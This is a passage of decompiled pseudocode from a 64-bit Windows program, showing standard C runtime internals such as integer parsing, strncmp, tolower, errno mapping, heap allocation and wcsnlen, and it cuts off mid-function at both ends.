        goto LABEL_61;
      }
      if ( v10 < 0x6F0u )
        goto LABEL_62;
      if ( v10 >= 0x6FAu )
      {
        if ( v10 < 0x966u )
          goto LABEL_62;
        if ( v10 >= 0x970u )
        {
          if ( v10 < 0x9E6u )
            goto LABEL_62;
          if ( v10 >= 0x9F0u )
          {
            if ( v10 < 0xA66u )
              goto LABEL_62;
            if ( v10 >= 0xA70u )
            {
              v13 = 2790;
              if ( v10 < 0xAE6u )
                goto LABEL_62;
              if ( v10 >= 0xAF0u )
              {
                v13 = 2918;
                if ( v10 < 0xB66u )
                  goto LABEL_62;
                if ( v10 >= 0xB70u )
                {
                  v13 = 3174;
                  if ( v10 < 0xC66u )
                    goto LABEL_62;
                  if ( v10 >= 0xC70u )
                  {
                    v13 = 3302;
                    if ( v10 < 0xCE6u )
                      goto LABEL_62;
                    if ( v10 >= 0xCF0u )
                    {
                      v13 = 3430;
                      if ( v10 < 0xD66u )
                        goto LABEL_62;
                      if ( v10 >= 0xD70u )
                      {
                        v13 = 3664;
                        if ( v10 < 0xE50u )
                          goto LABEL_62;
                        if ( v10 >= 0xE5Au )
                        {
                          v13 = 3792;
                          if ( v10 < 0xED0u )
                            goto LABEL_62;
                          if ( v10 >= 0xEDAu )
                          {
                            v13 = 3872;
                            if ( v10 < 0xF20u )
                              goto LABEL_62;
                            if ( v10 >= 0xF2Au )
                            {
                              v13 = 4160;
                              if ( v10 < 0x1040u )
                                goto LABEL_62;
                              if ( v10 >= 0x104Au )
                              {
                                v13 = 6112;
                                if ( v10 < 0x17E0u )
                                  goto LABEL_62;
                                if ( v10 >= 0x17EAu )
                                {
                                  v13 = 6160;
                                  if ( v10 < 0x1810u || v10 >= 0x181Au )
                                    goto LABEL_62;
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
              goto LABEL_22;
            }
            v14 = v10 - 2662;
          }
          else
          {
            v14 = v10 - 2534;
          }
        }
        else
        {
          v14 = v10 - 2406;
        }
      }
      else
      {
        v14 = v10 - 1776;
      }
    }
LABEL_61:
    if ( v14 != -1 )
    {
LABEL_68:
      if ( v14 != 0 )
      {
        if ( v5 == 0 )
          v5 = 10;
      }
      else
      {
        v16 = **a2;
        v17 = *a2 + 1;
        *a2 = v17;
        if ( ((v16 - 88) & 0xFFDF) != 0 )
        {
          if ( v5 == 0 )
            v5 = 8;
          v18 = v17 - 1;
          *a2 = v18;
          if ( v16 != 0 && *v18 != v16 )
          {
            *errno() = 22;
            invalid_parameter_noinfo();
          }
        }
        else
        {
          v10 = *v17;
          if ( v5 == 0 )
            v5 = 16;
          *a2 = v17 + 1;
        }
      }
      goto LABEL_80;
    }
LABEL_62:
    if ( (unsigned __int16)(v10 - 65) <= 0x19u || (unsigned __int16)(v10 - 97) <= 0x19u )
    {
      v15 = v10;
      if ( (unsigned __int16)(v10 - 97) <= 0x19u )
        v15 = v10 - 32;
      v14 = v15 - 55;
    }
    else
    {
      v14 = -1;
    }
    goto LABEL_68;
  }
LABEL_80:
  v19 = 0xFFFFFFFF / v5;
  while ( 1 )
  {
    if ( v10 >= 0x30u )
    {
      if ( v10 < 0x3Au )
      {
        v20 = v10 - 48;
        goto LABEL_124;
      }
      if ( v10 >= 0xFF10u )
      {
        if ( v10 >= 0xFF1Au )
          v20 = -1;
        else
          v20 = v10 - 65296;
LABEL_124:
        if ( v20 != -1 )
          goto LABEL_131;
        goto LABEL_125;
      }
      if ( v10 >= 0x660u )
      {
        if ( v10 < 0x66Au )
        {
          v20 = v10 - 1632;
          goto LABEL_124;
        }
        if ( v10 >= 0x6F0u )
        {
          if ( v10 < 0x6FAu )
          {
            v20 = v10 - 1776;
            goto LABEL_124;
          }
          v21 = 2406;
          if ( v10 >= 0x966u )
          {
            if ( v10 < 0x970u )
              goto LABEL_93;
            v21 = 2534;
            if ( v10 >= 0x9E6u )
            {
              if ( v10 < 0x9F0u )
                goto LABEL_93;
              v21 = 2662;
              if ( v10 >= 0xA66u )
              {
                if ( v10 < 0xA70u )
                  goto LABEL_93;
                v21 = 2790;
                if ( v10 >= 0xAE6u )
                {
                  if ( v10 < 0xAF0u )
                    goto LABEL_93;
                  v21 = 2918;
                  if ( v10 >= 0xB66u )
                  {
                    if ( v10 < 0xB70u )
                      goto LABEL_93;
                    v21 = 3174;
                    if ( v10 >= 0xC66u )
                    {
                      if ( v10 < 0xC70u )
                        goto LABEL_93;
                      v21 = 3302;
                      if ( v10 >= 0xCE6u )
                      {
                        if ( v10 < 0xCF0u
                          || (v21 = 3430, v10 >= 0xD66u)
                          && (v10 < 0xD70u
                           || (v21 = 3664, v10 >= 0xE50u)
                           && (v10 < 0xE5Au
                            || (v21 = 3792, v10 >= 0xED0u)
                            && (v10 < 0xEDAu
                             || (v21 = 3872, v10 >= 0xF20u)
                             && (v10 < 0xF2Au
                              || (v21 = 4160, v10 >= 0x1040u)
                              && (v10 < 0x104Au
                               || (v21 = 6112, v10 >= 0x17E0u)
                               && (v10 < 0x17EAu || (v21 = 6160, v10 >= 0x1810u) && v10 < 0x181Au)))))) )
                        {
LABEL_93:
                          v20 = v10 - v21;
                          goto LABEL_124;
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
LABEL_125:
    if ( (unsigned __int16)(v10 - 65) <= 0x19u || (unsigned __int16)(v10 - 97) <= 0x19u )
    {
      v22 = v10;
      if ( (unsigned __int16)(v10 - 97) <= 0x19u )
        v22 = v10 - 32;
      v20 = v22 - 55;
    }
    else
    {
      v20 = -1;
    }
LABEL_131:
    if ( v20 == -1 || v20 >= v5 )
      break;
    v12 |= 8u;
    if ( v9 < v19 || v9 == v19 && v20 <= 0xFFFFFFFF % v5 )
      v9 = v20 + v5 * v9;
    else
      v12 |= 4u;
    v10 = *(*a2)++;
  }
  --*a2;
  if ( v10 != 0 && **a2 != v10 )
  {
    *errno() = 22;
    invalid_parameter_noinfo();
  }
  if ( (v12 & 8) != 0 )
  {
    if ( __crt_strtox::is_overflow_condition<unsigned long>(v12, v9) )
    {
      *errno() = 34;
      if ( (v12 & 1) != 0 )
      {
        if ( (v12 & 2) != 0 )
        {
          if ( v28 != 0 )
            *(_DWORD *)(v27[0] + 936LL) &= ~2u;
          v23 = (wint_t **)a2[1];
          if ( v23 != nullptr )
            *v23 = *a2;
          return 0x80000000LL;
        }
        else
        {
          if ( v28 != 0 )
            *(_DWORD *)(v27[0] + 936LL) &= ~2u;
          v24 = (wint_t **)a2[1];
          if ( v24 != nullptr )
            *v24 = *a2;
          return 0x7FFFFFFF;
        }
      }
      v9 = -1;
    }
    else if ( (v12 & 2) != 0 )
    {
      v9 = -v9;
    }
    if ( v28 != 0 )
      *(_DWORD *)(v27[0] + 936LL) &= ~2u;
    v25 = (wint_t **)a2[1];
    if ( v25 != nullptr )
      *v25 = *a2;
    return v9;
  }
  *a2 = v26;
  if ( v28 != 0 )
    *(_DWORD *)(v27[0] + 936LL) &= ~2u;
LABEL_3:
  v7 = (wint_t **)a2[1];
  if ( v7 != nullptr )
    *v7 = *a2;
  return 0;
}


// ===== strncmp @ 0x140007090 size=0x7d =====
int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)
{
  signed __int64 v3; // rdx
  unsigned __int8 v4; // al
  __int64 v5; // rax
  bool v6; // cc
  __int64 v7; // rax

  v3 = Str2 - Str1;
  if ( MaxCount != 0 )
  {
    if ( ((unsigned __int8)Str1 & 7) == 0 )
    {
_qword_loop_begin:
      while ( (((_WORD)Str1 + (_WORD)v3) & 0xFFFu) <= 0xFF8 )
      {
        v5 = *(_QWORD *)Str1;
        if ( *(_QWORD *)Str1 != *(_QWORD *)&Str1[v3] )
          break;
        Str1 += 8;
        v6 = MaxCount <= 8;
        MaxCount -= 8LL;
        if ( v6 || ((v5 - 0x101010101010101LL) & ~v5 & 0x8080808080808080uLL) != 0 )
          goto return_equal;
      }
    }
    while ( 1 )
    {
      v4 = *Str1;
      if ( *Str1 != Str1[v3] )
        return -(__int64)(v4 < (unsigned int)Str1[v3]) | 1;
      ++Str1;
      if ( --MaxCount == 0 || v4 == 0 )
        goto return_equal;
      if ( ((unsigned __int8)Str1 & 7) == 0 )
        goto _qword_loop_begin;
    }
  }
  else
  {
return_equal:
    LODWORD(v7) = 0;
  }
  return v7;
}


// ===== __acrt_call_reportfault @ 0x140007110 size=0x15b =====
void __fastcall _acrt_call_reportfault(int a1, unsigned int a2, unsigned int a3)
{
  ULONG64 Rip; // r14
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v7; // rax
  BOOL v8; // edi
  unsigned __int64 ImageBase; // [rsp+40h] [rbp-C0h] BYREF
  struct _EXCEPTION_POINTERS ExceptionInfo; // [rsp+48h] [rbp-B8h] BYREF
  PVOID HandlerData; // [rsp+58h] [rbp-A8h] BYREF
  unsigned __int64 EstablisherFrame; // [rsp+60h] [rbp-A0h] BYREF
  __m128i v13; // [rsp+70h] [rbp-90h] BYREF
  DWORD64 v14; // [rsp+80h] [rbp-80h]
  struct _CONTEXT ContextRecord; // [rsp+110h] [rbp+10h] BYREF
  DWORD64 retaddr; // [rsp+608h] [rbp+508h]
  __int64 v17; // [rsp+610h] [rbp+510h] BYREF

  if ( a1 != -1 )
    sub_140002710();
  sub_140002F60(&v13, 0, 0x98u);
  sub_140002F60((__m128i *)&ContextRecord, 0, 0x4D0u);
  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)&v13;
  ExceptionInfo.ContextRecord = &ContextRecord;
  RtlCaptureContext(&ContextRecord);
  Rip = ContextRecord.Rip;
  v7 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, nullptr);
  if ( v7 != nullptr )
    RtlVirtualUnwind(0, ImageBase, Rip, v7, &ContextRecord, &HandlerData, &EstablisherFrame, nullptr);
  ContextRecord.Rip = retaddr;
  v13.m128i_i64[0] = __PAIR64__(a3, a2);
  ContextRecord.Rsp = (DWORD64)&v17;
  v14 = retaddr;
  v8 = IsDebuggerPresent();
  SetUnhandledExceptionFilter(nullptr);
  if ( UnhandledExceptionFilter(&ExceptionInfo) == 0 && !v8 && a1 != -1 )
    sub_140002710();
}


// ===== sub_14000726C @ 0x14000726c size=0x8 =====
void __fastcall sub_14000726C(__int64 a1)
{
  qword_14001D320 = a1;
}


// ===== _invalid_parameter @ 0x140007274 size=0xa7 =====
__int64 __fastcall invalid_parameter(
        wchar_t *Expression,
        wchar_t *FunctionName,
        wchar_t *FileName,
        unsigned int LineNo,
        uintptr_t Reserved)
{
  __int64 v9; // rax
  __int64 (__fastcall *v10)(wchar_t *, wchar_t *, wchar_t *, _QWORD); // rbx

  v9 = _acrt_getptd_noexit();
  if ( v9 == 0 || (v10 = *(__int64 (__fastcall **)(wchar_t *, wchar_t *, wchar_t *, _QWORD))(v9 + 952)) == nullptr )
  {
    v10 = (__int64 (__fastcall *)(wchar_t *, wchar_t *, wchar_t *, _QWORD))__ROR8__(
                                                                             qword_14001D320 ^ _security_cookie,
                                                                             _security_cookie & 0x3F);
    if ( v10 == nullptr )
      invoke_watson(Expression, FunctionName, FileName, LineNo, Reserved);
  }
  return v10(Expression, FunctionName, FileName, LineNo);
}


// ===== _invalid_parameter_noinfo @ 0x14000731c size=0x1e =====
void __cdecl invalid_parameter_noinfo()
{
  invalid_parameter(nullptr, nullptr, nullptr, 0, 0);
}


// ===== _invoke_watson @ 0x14000733c size=0x46 =====
void __cdecl __noreturn invoke_watson(
        const wchar_t *Expression,
        const wchar_t *FunctionName,
        const wchar_t *FileName,
        unsigned int LineNo,
        uintptr_t Reserved)
{
  HANDLE CurrentProcess; // rax

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(5u);
  _acrt_call_reportfault(2, 0xC0000417, 1u);
  CurrentProcess = GetCurrentProcess();
  TerminateProcess(CurrentProcess, 0xC0000417);
}


// ===== isdigit @ 0x140007384 size=0x74 =====
int __cdecl isdigit(int C)
{
  __int64 v1; // rbx
  int v2; // edx
  __int64 v4; // [rsp+20h] [rbp-28h] BYREF
  __crt_locale_pointers Locale; // [rsp+28h] [rbp-20h] BYREF
  char v6; // [rsp+38h] [rbp-10h]

  v1 = C;
  if ( dword_14001D2E4 == 0 )
    return off_14001C160[C] & 4;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v4, nullptr);
  if ( *((int *)Locale.locinfo + 2) <= 1 )
    v2 = *(_WORD *)(*(_QWORD *)Locale.locinfo + 2 * v1) & 4;
  else
    v2 = isctype_l(v1, 4, &Locale);
  if ( v6 != 0 )
    *(_DWORD *)(v4 + 936) &= ~2u;
  return v2;
}


// ===== ?internal_isupper_l@@YA_NHQEAU__crt_locale_pointers@@@Z @ 0x1400073f8 size=0x4d =====
bool __fastcall internal_isupper_l(int a1, struct __crt_locale_pointers *const a2)
{
  __int64 v2; // rdi
  int v3; // eax
  const unsigned __int16 *v4; // rax

  v2 = a1;
  if ( a2 == nullptr )
  {
    v4 = _pctype_func();
    goto LABEL_6;
  }
  if ( *((int *)a2->locinfo + 2) <= 1 )
  {
    v4 = *(const unsigned __int16 **)a2->locinfo;
LABEL_6:
    v3 = v4[v2] & 1;
    return v3 != 0;
  }
  v3 = isctype_l(a1, 1, a2);
  return v3 != 0;
}


// ===== _tolower_l @ 0x140007448 size=0x13e =====
int __cdecl tolower_l(int C, _locale_t Locale)
{
  __int64 v2; // rbx
  int v3; // ecx
  int *v4; // rax
  int v5; // eax
  __int64 v7; // [rsp+50h] [rbp-20h] BYREF
  __crt_locale_pointers Localea; // [rsp+58h] [rbp-18h] BYREF
  char v9; // [rsp+68h] [rbp-8h]
  __int16 v10; // [rsp+80h] [rbp+10h] BYREF
  char v11; // [rsp+82h] [rbp+12h]
  __int16 v12; // [rsp+90h] [rbp+20h] BYREF
  char v13; // [rsp+92h] [rbp+22h]

  v2 = C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v7, Locale);
  if ( (unsigned int)v2 < 0x100 )
  {
    if ( internal_isupper_l(v2, &Localea) )
      LODWORD(v2) = *(unsigned __int8 *)(*((_QWORD *)Localea.locinfo + 34) + v2);
LABEL_4:
    if ( v9 != 0 )
      *(_DWORD *)(v7 + 936) &= ~2u;
    return v2;
  }
  v10 = 0;
  v11 = 0;
  if ( *((int *)Localea.locinfo + 2) > 1 && isleadbyte_l(BYTE1(v2), &Localea) != 0 )
  {
    LOBYTE(v10) = BYTE1(v2);
    v3 = 2;
    HIBYTE(v10) = v2;
    v11 = 0;
  }
  else
  {
    v4 = errno();
    v3 = 1;
    *v4 = 42;
    v10 = (unsigned __int8)v2;
  }
  v12 = 0;
  v13 = 0;
  v5 = _acrt_LCMapStringA(
         &Localea,
         *((wchar_t **)Localea.locinfo + 39),
         0x100u,
         (char *)&v10,
         v3,
         (char *)&v12,
         3,
         *((_DWORD *)Localea.locinfo + 3),
         1);
  if ( v5 == 0 )
    goto LABEL_4;
  LODWORD(v2) = (unsigned __int8)v12;
  if ( v5 == 1 )
    goto LABEL_4;
  LODWORD(v2) = HIBYTE(v12) | ((unsigned __int8)v12 << 8);
  if ( v9 != 0 )
    *(_DWORD *)(v7 + 936) &= ~2u;
  return v2;
}


// ===== tolower @ 0x140007588 size=0x2b =====
int __cdecl tolower(int C)
{
  if ( dword_14001D2E4 != 0 )
    return tolower_l(C, nullptr);
  if ( (unsigned int)(C - 65) <= 0x19 )
    C += 32;
  return C;
}


// ===== __acrt_errno_from_os_error @ 0x1400075b4 size=0x45 =====
__int64 __fastcall _acrt_errno_from_os_error(int a1)
{
  __int64 v1; // rax
  unsigned int *v2; // rdx
  __int64 result; // rax

  v1 = 0;
  v2 = dword_140012190;
  do
  {
    if ( a1 == *v2 )
      return dword_140012190[2 * v1 + 1];
    v1 = (unsigned int)(v1 + 1);
    v2 += 2;
  }
  while ( (unsigned int)v1 < 0x2D );
  if ( (unsigned int)(a1 - 19) <= 0x11 )
    return 13;
  result = 22;
  if ( (unsigned int)(a1 - 188) <= 0xE )
    return 8;
  return result;
}


// ===== __acrt_errno_map_os_error @ 0x1400075fc size=0x4e =====
__int64 __fastcall _acrt_errno_map_os_error(int a1)
{
  __int64 v2; // rax
  int *v3; // rax
  __int64 v4; // rax
  _DWORD *v5; // rbx
  __int64 result; // rax

  v2 = _acrt_getptd_noexit();
  if ( v2 != 0 )
    v3 = (int *)(v2 + 36);
  else
    v3 = (int *)&unk_14001C154;
  *v3 = a1;
  v4 = _acrt_getptd_noexit();
  v5 = &unk_14001C150;
  if ( v4 != 0 )
    v5 = (_DWORD *)(v4 + 32);
  result = _acrt_errno_from_os_error(a1);
  *v5 = result;
  return result;
}


// ===== __doserrno @ 0x14000764c size=0x20 =====
unsigned int *__cdecl _doserrno()
{
  __int64 v0; // rax

  v0 = _acrt_getptd_noexit();
  if ( v0 != 0 )
    return (unsigned int *)(v0 + 36);
  else
    return (unsigned int *)&unk_14001C154;
}


// ===== _errno @ 0x14000766c size=0x20 =====
int *__cdecl errno()
{
  __int64 v0; // rax

  v0 = _acrt_getptd_noexit();
  if ( v0 != 0 )
    return (int *)(v0 + 32);
  else
    return (int *)&unk_14001C150;
}


// ===== _free_base @ 0x14000768c size=0x3d =====
void __cdecl free_base(void *Block)
{
  int *v1; // rbx
  DWORD LastError; // eax

  if ( Block != nullptr && !HeapFree(hHeap, 0, Block) )
  {
    v1 = errno();
    LastError = GetLastError();
    *v1 = _acrt_errno_from_os_error(LastError);
  }
}


// ===== _malloc_base @ 0x1400076cc size=0x5e =====
void *__cdecl malloc_base(size_t Size)
{
  size_t v1; // rbx
  void *result; // rax

  v1 = Size;
  if ( Size > 0xFFFFFFFFFFFFFFE0uLL )
  {
LABEL_9:
    *errno() = 12;
    return nullptr;
  }
  else
  {
    if ( Size == 0 )
      v1 = 1;
    while ( 1 )
    {
      result = HeapAlloc(hHeap, 0, v1);
      if ( result != nullptr )
        break;
      if ( (unsigned int)sub_140006248() == 0 || callnewh(v1) == 0 )
        goto LABEL_9;
    }
  }
  return result;
}


// ===== unknown_libname_15 @ 0x14000772c size=0x13 =====
// Microsoft VisualC 64bit universal runtime
_QWORD *__fastcall unknown_libname_15(_QWORD *a1, __int64 a2, _QWORD *a3)
{
  *a1 = a2;
  a1[1] = a3;
  if ( a3 != nullptr )
    *a3 = a2;
  return a1;
}


// ===== wcstol @ 0x140007740 size=0x2f =====
int __cdecl wcstol(const wchar_t *String, wchar_t **EndPtr, int Radix)
{
  wint_t **v4; // rax
  _QWORD v6[3]; // [rsp+20h] [rbp-18h] BYREF

  v4 = (wint_t **)unknown_libname_15(v6, (__int64)String, EndPtr);
  return __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<wchar_t>>(
           nullptr,
           v4,
           Radix,
           1);
}


// ===== _mbtowc_l @ 0x140007770 size=0x148 =====
int __cdecl mbtowc_l(wchar_t *DstCh, const char *SrcCh, size_t SrcSizeInBytes, _locale_t Locale)
{
  int v8; // ebx
  struct __crt_locale_data *locinfo; // rcx
  int v10; // r9d
  int v11; // eax
  __int64 v12; // [rsp+30h] [rbp-28h] BYREF
  __crt_locale_pointers Localea; // [rsp+38h] [rbp-20h] BYREF
  char v14; // [rsp+48h] [rbp-10h]

  if ( SrcCh == nullptr || SrcSizeInBytes == 0 )
    return 0;
  if ( *SrcCh == 0 )
  {
    if ( DstCh != nullptr )
      *DstCh = 0;
    return 0;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v12, Locale);
  if ( *((_QWORD *)Localea.locinfo + 39) == 0 )
  {
    if ( DstCh != nullptr )
      *DstCh = *(unsigned __int8 *)SrcCh;
    v8 = 1;
    goto LABEL_20;
  }
  v8 = 1;
  if ( isleadbyte_l(*(unsigned __int8 *)SrcCh, &Localea) == 0 )
  {
    if ( MultiByteToWideChar(*((_DWORD *)Localea.locinfo + 3), 9u, SrcCh, 1, DstCh, DstCh != nullptr) != 0 )
      goto LABEL_20;
LABEL_19:
    v8 = -1;
    *errno() = 42;
    goto LABEL_20;
  }
  locinfo = Localea.locinfo;
  v10 = *((_DWORD *)Localea.locinfo + 2);
  if ( v10 <= 1
    || (int)SrcSizeInBytes < v10
    || (v11 = MultiByteToWideChar(*((_DWORD *)Localea.locinfo + 3), 9u, SrcCh, v10, DstCh, DstCh != nullptr),
        locinfo = Localea.locinfo,
        v11 == 0) )
  {
    if ( SrcSizeInBytes < *((int *)locinfo + 2) || SrcCh[1] == 0 )
      goto LABEL_19;
  }
  v8 = *((_DWORD *)locinfo + 2);
LABEL_20:
  if ( v14 != 0 )
    *(_DWORD *)(v12 + 936) &= ~2u;
  return v8;
}


// ===== mbtowc @ 0x1400078b8 size=0x8 =====
int __cdecl mbtowc(wchar_t *DstCh, const char *SrcCh, size_t SrcSizeInBytes)
{
  return mbtowc_l(DstCh, SrcCh, SrcSizeInBytes, nullptr);
}


// ===== wcsnlen @ 0x1400078c0 size=0x1f0 =====
size_t __cdecl wcsnlen(const wchar_t *Source, size_t MaxCount)
{
  const wchar_t *v4; // rax
  const wchar_t *i; // rdx
  size_t v6; // r11
  const wchar_t *v7; // rdx
  const wchar_t *v8; // rax
  size_t v9; // rdx
  const wchar_t *v10; // rdx
  const wchar_t *v12; // r11
  const wchar_t *v15; // rax
  size_t v16; // r11
  const wchar_t *v17; // rdx
  const wchar_t *v18; // rax
  __m128i *v19; // rdx
  __m128i *v20; // r11
  __int64 v21; // rdx
  const wchar_t *v22; // rax

  if ( dword_14001C018 < 5 )
  {
    if ( dword_14001C018 < 1 )
    {
      v22 = &Source[MaxCount];
      for ( i = Source; i != v22; ++i )
      {
        if ( *i == 0 )
          break;
      }
      goto LABEL_46;
    }
    if ( ((unsigned __int8)Source & 1) != 0 )
    {
      v15 = &Source[MaxCount];
      for ( i = Source; i != v15; ++i )
      {
        if ( *i == 0 )
          break;
      }
      goto LABEL_46;
    }
    v16 = ((16LL - ((unsigned __int8)Source & 0xF)) & (unsigned __int64)-(__int64)(((unsigned __int8)Source & 0xF) != 0)) >> 1;
    if ( MaxCount < v16 )
      v16 = MaxCount;
    v17 = Source;
    v18 = &Source[v16];
    if ( Source != v18 )
    {
      do
      {
        if ( *v17 == 0 )
          break;
        ++v17;
      }
      while ( v17 != v18 );
    }
    v9 = v17 - Source;
    if ( v9 == v16 )
    {
      v19 = (__m128i *)&Source[v9];
      v20 = (__m128i *)((char *)v19 + 2 * (MaxCount - v16 - (((_BYTE)MaxCount - (_BYTE)v16) & 0xF)));
      while ( v19 != v20 && _mm_movemask_epi8(_mm_cmpeq_epi16((__m128i)0LL, *v19)) == 0 )
        ++v19;
      while ( v19 != (__m128i *)&Source[MaxCount] && v19->m128i_i16[0] != 0 )
        v19 = (__m128i *)((char *)v19 + 2);
      v21 = (char *)v19 - (char *)Source;
      return v21 >> 1;
    }
  }
  else
  {
    if ( ((unsigned __int8)Source & 1) != 0 )
    {
      v4 = &Source[MaxCount];
      for ( i = Source; i != v4; ++i )
      {
        if ( *i == 0 )
          break;
      }
LABEL_46:
      v21 = (char *)i - (char *)Source;
      return v21 >> 1;
    }
    v6 = ((32LL - ((unsigned __int8)Source & 0x1F)) & (unsigned __int64)-(__int64)(((unsigned __int8)Source & 0x1F) != 0)) >> 1;
    if ( MaxCount < v6 )
      v6 = MaxCount;
    v7 = Source;
    v8 = &Source[v6];
    if ( Source != v8 )
    {
      do
      {
        if ( *v7 == 0 )
          break;
        ++v7;
      }
      while ( v7 != v8 );
    }
    v9 = v7 - Source;
    if ( v9 == v6 )
    {
      v10 = &Source[v9];
      __asm { vxorps  ymm2, ymm2, ymm2 }
      v12 = &v10[MaxCount - v6 - (((_BYTE)MaxCount - (_BYTE)v6) & 0x1F)];
      while ( v10 != v12 )
      {
        __asm
        {
          vpcmpeqw ymm1, ymm2, ymmword ptr [rdx]
          vpmovmskb eax, ymm1
        }
        if ( _EAX != 0 )
          break;
        v10 += 16;
      }
      while ( v10 != &Source[MaxCount] && *v10 != 0 )
        ++v10;
      v9 = v10 - Source;
      __asm { vzeroupper }
    }
  }
  return v9;
}


// ===== ??$?RV_lambda_46352004c1216016012b18bd6f87e700_@@AEAV_lambda_3bd07e1a1191394380780325891bf33f_@@V_lambda_334532d3f185bcaa59b5be82d7d22bff_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_46352004c1216016012b18bd6f87e700_@@AEAV_lambda_3bd07e1a1191394380780325891bf33f_@@$$QEAV_lambda_334532d3f185bcaa59b5be82d7d22bff_@@@Z @ 0x140007ab0 size=0x5f =====
__int64 __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_46352004c1216016012b18bd6f87e700_,_lambda_3bd07e1a1191394380780325891bf33f_ &,_lambda_334532d3f185bcaa59b5be82d7d22bff_>(
        __int64 a1,
        unsigned int *a2,
        __int64 a3,
        unsigned int *a4)
{
  void *v6; // rcx

  sub_14000AB5C(*a2);
  v6 = *(void **)(**(_QWORD **)a3 + 136LL);
  if ( v6 != nullptr && _InterlockedExchangeAdd((volatile signed __int32 *)v6, 0xFFFFFFFF) == 1 && v6 != &unk_14001C2D0 )
    free_base(v6);
  return sub_14000ABB0(*a4);
}


// ===== ??$?RV_lambda_5e887d1dcbef67a5eb4283622ba103bf_@@AEAV_lambda_4466841279450cc726390878d4a41900_@@V_lambda_341c25c0346d94847f1f3c463c57e077_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_5e887d1dcbef67a5eb4283622ba103bf_@@AEAV_lambda_4466841279450cc726390878d4a41900_@@$$QEAV_lambda_341c25c0346d94847f1f3c463c57e077_@@@Z @ 0x140007b10 size=0x45 =====
__int64 __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_5e887d1dcbef67a5eb4283622ba103bf_,_lambda_4466841279450cc726390878d4a41900_ &,_lambda_341c25c0346d94847f1f3c463c57e077_>(
        __int64 a1,
        unsigned int *a2,
        __int64 a3,
        unsigned int *a4)
{
  sub_14000AB5C(*a2);
  replace_current_thread_locale_nolock(
    **(struct __acrt_ptd *const **)a3,
    ***(struct __crt_locale_data *const ***)(a3 + 8));
  return sub_14000ABB0(*a4);
}


// ===== ??$?RV_lambda_72d1df2b273a38828b1ce30cbf4cdab5_@@AEAV_lambda_876a65b173b8412d3a47c70a915b0cf4_@@V_lambda_41932305e351933ebe8f8be3ed8bb5dc_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_72d1df2b273a38828b1ce30cbf4cdab5_@@AEAV_lambda_876a65b173b8412d3a47c70a915b0cf4_@@$$QEAV_lambda_41932305e351933ebe8f8be3ed8bb5dc_@@@Z @ 0x140007b58 size=0x3f =====
__int64 __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_72d1df2b273a38828b1ce30cbf4cdab5_,_lambda_876a65b173b8412d3a47c70a915b0cf4_ &,_lambda_41932305e351933ebe8f8be3ed8bb5dc_>(
        __int64 a1,
        unsigned int *a2,
        __int64 a3,
        unsigned int *a4)
{
  sub_14000AB5C(*a2);
  _InterlockedIncrement(*(volatile signed __int32 **)(**(_QWORD **)a3 + 136LL));
  return sub_14000ABB0(*a4);
}


// ===== ??$?RV_lambda_fb3a7dec4e47f37f22dae91bb15c9095_@@AEAV_lambda_698284760c8add0bfb0756c19673e34b_@@V_lambda_dfb8eca1e75fef3034a8fb18dd509707_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_fb3a7dec4e47f37f22dae91bb15c9095_@@AEAV_lambda_698284760c8add0bfb0756c19673e34b_@@$$QEAV_lambda_dfb8eca1e75fef3034a8fb18dd509707_@@@Z @ 0x140007b98 size=0x3d =====
__int64 __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_fb3a7dec4e47f37f22dae91bb15c9095_,_lambda_698284760c8add0bfb0756c19673e34b_ &,_lambda_dfb8eca1e75fef3034a8fb18dd509707_>(
        __int64 a1,
        unsigned int *a2,
        struct __acrt_ptd *const **a3,
        unsigned int *a4)
{
  sub_14000AB5C(*a2);
  replace_current_thread_locale_nolock(**a3, nullptr);
  return sub_14000ABB0(*a4);
}


// ===== ?construct_ptd_array@@YAXQEAU__acrt_ptd@@@Z @ 0x140007bd8 size=0xcd =====
void __fastcall construct_ptd_array(struct __acrt_ptd *const a1)
{
  unsigned int v1; // [rsp+20h] [rbp-30h] BYREF
  unsigned int v2; // [rsp+24h] [rbp-2Ch] BYREF
  struct __acrt_ptd *v3; // [rsp+28h] [rbp-28h] BYREF
  __int64 *v4; // [rsp+30h] [rbp-20h] BYREF
  struct __acrt_ptd **v5; // [rsp+38h] [rbp-18h] BYREF
  _QWORD v6[2]; // [rsp+40h] [rbp-10h] BYREF
  char v7; // [rsp+68h] [rbp+18h] BYREF
  unsigned int v8; // [rsp+70h] [rbp+20h] BYREF
  unsigned int v9; // [rsp+78h] [rbp+28h] BYREF

  v3 = a1;
  v5 = &v3;
  v8 = 5;
  v9 = 5;
  v6[0] = &v3;
  v6[1] = &v4;
  v1 = 4;
  v2 = 4;
  v4 = &qword_14001D340;
  *((_DWORD *)a1 + 10) = 1;
  *(_QWORD *)v3 = &unk_140011FA0;
  *((_DWORD *)v3 + 234) = 1;
  *((_QWORD *)v3 + 17) = &unk_14001C2D0;
  *((_WORD *)v3 + 94) = 67;
  *((_WORD *)v3 + 225) = 67;
  *((_QWORD *)v3 + 116) = 0;
  __crt_seh_guarded_call<void>::operator()<_lambda_72d1df2b273a38828b1ce30cbf4cdab5_,_lambda_876a65b173b8412d3a47c70a915b0cf4_ &,_lambda_41932305e351933ebe8f8be3ed8bb5dc_>(
    (__int64)&v7,
    &v9,
    (__int64)&v5,
    &v8);
